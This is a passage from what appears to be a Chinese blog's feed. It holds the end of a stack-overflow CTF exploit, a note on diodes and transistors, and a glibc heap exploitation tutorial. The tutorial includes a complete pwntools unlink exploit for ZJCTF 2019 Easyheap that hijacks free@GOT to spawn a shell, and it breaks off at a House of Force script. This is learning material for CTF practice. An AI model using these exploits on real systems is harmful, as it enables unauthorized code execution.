class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x52&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x62&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x72&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x82&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\x92&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xa2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xb2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xc2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xd2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xe2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line">pyload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>) + canary </span><br><span class="line">pyload += <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x28\xf2&#x27;</span></span><br><span class="line">pt.send(pyload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半导体基础</title>
      <link href="/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/"/>
      <url>/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<blockquote><p>模电我真的好喜欢你啊啊啊:heart_eyes:</p></blockquote><h1 id="二极管"><a href="#二极管" class="headerlink" title="二极管"></a>二极管</h1><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526210931337.png" alt="image-20230526210931337"><br>$$<br>i&#x3D;I_s(e^{\frac{u}{U_T}}-1),常温下U_T&#x3D;26mV<br>$$</p><h2 id="等效电路"><a href="#等效电路" class="headerlink" title="等效电路"></a>等效电路</h2><p><strong>大信号模型：</strong></p><ul><li>理想二极管</li><li>理想二极管串一个反向的$U_{ON}$电压源</li></ul><p><strong>小信号模型（静态点附近）：</strong></p><ul><li>动态电阻$r_d&#x3D;\frac{\Delta u_D}{\Delta i_D}\approx\frac{U_T}{I_D}$</li></ul><h2 id="主要参数"><a href="#主要参数" class="headerlink" title="主要参数"></a>主要参数</h2><ul><li><p>最大整流电流$I_F$：平均</p></li><li><p>最大反向工作电压$U_R$：瞬时</p></li><li><p>反向电流$I_R(I_S)$ </p></li><li><p>最高工作频率$f_M$：PN结有电容效应</p></li></ul><h2 id="稳压二极管"><a href="#稳压二极管" class="headerlink" title="稳压二极管"></a>稳压二极管</h2><p>dddd</p><h1 id="晶体三极管Triode"><a href="#晶体三极管Triode" class="headerlink" title="晶体三极管Triode"></a>晶体三极管Triode</h1><p>:cry:</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211007779.png" alt="image-20230526211007779"></p><h2 id="放大作用"><a href="#放大作用" class="headerlink" title="放大作用"></a>放大作用</h2><h3 id="放大条件"><a href="#放大条件" class="headerlink" title="放大条件"></a>放大条件</h3><ol><li>$U_{BE}&gt;U_{on}$，发射结正偏</li><li>$U_{CB}\geq0$，即$U_{CE}\geq U_{BE}$，集电结反偏</li></ol><h3 id="电流分配"><a href="#电流分配" class="headerlink" title="电流分配"></a>电流分配</h3><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211012892.png" alt="image-20230526211012892"><br>$$<br>I_E&#x3D;I_B+I_C<br>$$<br>共射电流放大系数：<br>$$<br>\beta\approx\frac{I_C}{I_B}<br>$$<br>共基极电流放大系数：<br>$$<br>\alpha&#x3D;\frac{I_C}{I_E}<br>$$</p><h2 id="输入输出特性"><a href="#输入输出特性" class="headerlink" title="输入输出特性"></a>输入输出特性</h2><h3 id="输入特性"><a href="#输入特性" class="headerlink" title="输入特性"></a>输入特性</h3><p>$$<br>i_B&#x3D;f(u_{BE})\Big |<em>{U</em>{CE}}<br>$$</p><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211018315.png" alt="image-20230526211018315"></p><h2 id="输出特性"><a href="#输出特性" class="headerlink" title="输出特性"></a>输出特性</h2><p><img src="/../img/%E5%8D%8A%E5%AF%BC%E4%BD%93%E5%9F%BA%E7%A1%80.assets/image-20230526211022975.png" alt="image-20230526211022975"></p><h3 id="截止区"><a href="#截止区" class="headerlink" title="截止区"></a>截止区</h3><p>$$<br>u_{BE}&lt;U_{on},u_{BC}&lt;U_{on}<br>$$</p><h3 id="放大区"><a href="#放大区" class="headerlink" title="放大区"></a>放大区</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}&lt;U_{on}<br>$$</p><p>$$<br>i_C&#x3D;\beta i_B,\Delta i_C&#x3D;\beta\Delta i_B<br>$$</p><p>输出回路电流$i_C$几乎仅仅取决于输入回路电流$i_B$，可等效为<strong>受控电流源</strong></p><h3 id="饱和区"><a href="#饱和区" class="headerlink" title="饱和区"></a>饱和区</h3><p>$$<br>u_{BE}\geq U_{on},u_{BC}\geq U_{on}<br>$$</p><p>失去控制作用，饱和导通状态</p><h1 id="MOSFET"><a href="#MOSFET" class="headerlink" title="MOSFET"></a>MOSFET</h1><h1 id="MOSFET放大电路"><a href="#MOSFET放大电路" class="headerlink" title="MOSFET放大电路"></a>MOSFET放大电路</h1><h2 id="MOSFET小信号分析"><a href="#MOSFET小信号分析" class="headerlink" title="MOSFET小信号分析"></a>MOSFET小信号分析</h2><p>$$<br>I_D&#x3D;\frac{K(V_I-V_{TH})^2}{2}<br>$$</p><p>$$<br>i_d&#x3D;K(V_I-V_{TH})v_i<br>$$</p><h3 id="小信号增益"><a href="#小信号增益" class="headerlink" title="小信号增益"></a>小信号增益</h3><p>$$<br>\bigg|\frac{v_o}{v_i}\bigg|&#x3D;K(V_I-V_T)R_L<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（三）——heap</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写的不好，有空再改</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dlmalloc  – General purpose allocator</span><br><span class="line">ptmalloc2 – glibc</span><br><span class="line">jemalloc  – FreeBSD and Firefox</span><br><span class="line">tcmalloc  – Google</span><br><span class="line">libumem   – Solaris</span><br></pre></td></tr></table></figure><h2 id="分配堆空间"><a href="#分配堆空间" class="headerlink" title="分配堆空间"></a>分配堆空间</h2><h3 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk&amp;sbrk"></a>brk&amp;sbrk</h3><p>main arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span> *addr)</span>;<span class="comment">//*addr为数据段结束地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span>;<span class="comment">//返回操作前数据段结束地址</span></span><br></pre></td></tr></table></figure><p>开启ASLR后，BSS segment和heap间存在Random brk offset；关闭后，堆开始地址和数据段结束地址重合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">cat /proc/86231/maps</span><br></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>thread arena</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> fildes, <span class="type">off_t</span> off)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span>;</span><br></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>第一次执行malloc</p><ul><li>size&gt;&#x3D;128kB<ul><li>mmap &#x3D;&gt; sys_mmap</li></ul></li><li>size&lt;128kB<ul><li>brk &#x3D;&gt; sys_brk</li></ul></li></ul><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>最小SIZE_T(ul)*4</p><p>chunk header(prev_size+size)+user data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>allocated chunk&#x2F;freed chunk:</p><ul><li>prev_size: 物理上连续，前不为空可复用</li><li>size:<ul><li>NON_MAIN_ARENA(<strong>A</strong>)</li><li>IS_MAPPED(<strong>M</strong>)</li><li>PREV_INUSE(<strong>P</strong>)</li></ul></li><li>fd,bk: linked list中，allocated chunk中复用</li><li>fd_nextsize,bk_nextsize: large chunk(不含bin)</li></ul><p>top chunk: </p><ul><li>prev_size</li><li>size: 剩下多少空间</li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221411859.png" alt="image-20230601221411859"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601221609068.png" alt="image-20230601221609068"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601222129466.png" alt="image-20230601222129466"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161203608.png" alt="image-20230619161203608"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161741499.png" alt="image-20230619161741499"></p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>10 个 fast bins，存储在 fastbinsY 中<br>1 个 unsorted bin，存储在 bin[1]<br>62 个 small bins，存储在 bin[2] 至 bin[63]<br>63 个 large bins，存储在 bin[64] 至 bin[126]</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>LIFO单链表(不用bk)</p><p>chunk 大小（含 chunk 头部）：0x10-0x40（64 位 0x20-0x80）</p><p>相邻 bin 存放的大小相差 0x8（0x10）B。</p><p>不取消inuse flag，故相邻不会合并</p><p>free的时候插到对应bin链表的前面，注意记录的地址为free的地址减0x10</p><p>同样的，malloc实际分配的内存大小应加上0x10</p><p>当分配一块较小的内存(mem&lt;&#x3D;64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>FIFO双向循环链表</p><p>大于fast bin时，暂存在unsorted bin</p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><p>FIFO双向循环链表</p><p>0x10-0x1f8(0x20-0x3f0)</p><p>相邻的空闲 chunk 会被合并</p><p>相邻 bin 存放的大小相差 0x8（0x10）B</p><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><p>大于等于 0x200（0x400）B（实际大小）</p><p>双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并</p><p>fd_nextsize,bk_nextsize</p><p>前32: 0x400 + 0x40*i</p><p>32~48: 0x1380 + 512*j</p><p>…</p><p>bin中大小不同，进行sort,大在前</p><h3 id="tcache-bins"><a href="#tcache-bins" class="headerlink" title="tcache bins"></a>tcache bins</h3><p>LIFO,max7,no prev_inuse</p><p>0x20-0x410(64in total,16byte)</p><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>malloc时，较大的chunk会split一部分到last remainder，unsorted bin也会存</p><p>下次malloc，够大会直接切出来</p><h2 id="main-arena-header"><a href="#main-arena-header" class="headerlink" title="main arena header"></a>main arena header</h2><p>存bin,top chunk等</p><p>libc bss中</p><h2 id="marge-freed-chunk"><a href="#marge-freed-chunk" class="headerlink" title="marge freed chunk"></a>marge freed chunk</h2><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul><li><p>detect next inuse bit: freed?(to avoid double freed)</p></li><li><p>last freed? &#x3D;&gt; unlink &#x3D;&gt; merge &#x3D;&gt; merge into unsorted bin</p></li><li><p>next top?</p><ul><li>next freed?<ul><li>inuse: merge into unsorted bin</li></ul></li></ul></li></ul><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>dangling pointer</p><h1 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h1><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="modern-protection"><a href="#modern-protection" class="headerlink" title="modern protection"></a>modern protection</h3><h4 id="corrupted-double-link-list"><a href="#corrupted-double-link-list" class="headerlink" title="corrupted double link list"></a>corrupted double link list</h4><p>when unlink</p><p>check if:</p><ul><li>P-&gt;bk-&gt;fd &#x3D;&#x3D; P</li><li>P-&gt;fd-&gt;bk &#x3D;&#x3D; P</li></ul><p>to satisfy:(i386)</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>then:</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230609205918850.png" alt="image-20230609205918850"></p><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>需要使fakechunk的指针高于原指针0x10个字节，才能通过检测</p><p>ptr-&gt;ptr-0x18</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610225454294.png" alt="image-20230610225454294"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610231438688.png" alt="image-20230610231438688"></p><h3 id="ZJCTF-2019-Easyheap"><a href="#ZJCTF-2019-Easyheap" class="headerlink" title="ZJCTF 2019 Easyheap"></a>ZJCTF 2019 Easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26809</span></span><br><span class="line"><span class="comment">#p = process(&quot;./easyheap&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">creat(<span class="number">0x20</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">addr = <span class="number">0x6020e0</span></span><br><span class="line">free_got = <span class="number">0x0000000000602018</span></span><br><span class="line">sys_plt = <span class="number">0x000000000400700</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0x81</span>, addr-<span class="number">0x18</span>, addr-<span class="number">0x10</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += flat([<span class="number">0x80</span>, <span class="number">0x90</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">payload = flat([free_got]).rjust(<span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys_plt))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持atoi，在menu中输入/bin/sh效果一样</span></span><br></pre></td></tr></table></figure><h4 id="fake-chunk"><a href="#fake-chunk" class="headerlink" title="fake chunk"></a>fake chunk</h4><h1 id="Using-malloc-maleficarum"><a href="#Using-malloc-maleficarum" class="headerlink" title="Using malloc maleficarum"></a>Using malloc maleficarum</h1><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>覆盖不到ret,可以盖到栈上free的指针位置</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230608162704523.png" alt="image-20230608162704523"></p><p>overflow后rop</p><h3 id="The-House-of-Force"><a href="#The-House-of-Force" class="headerlink" title="The House of Force"></a>The House of Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span 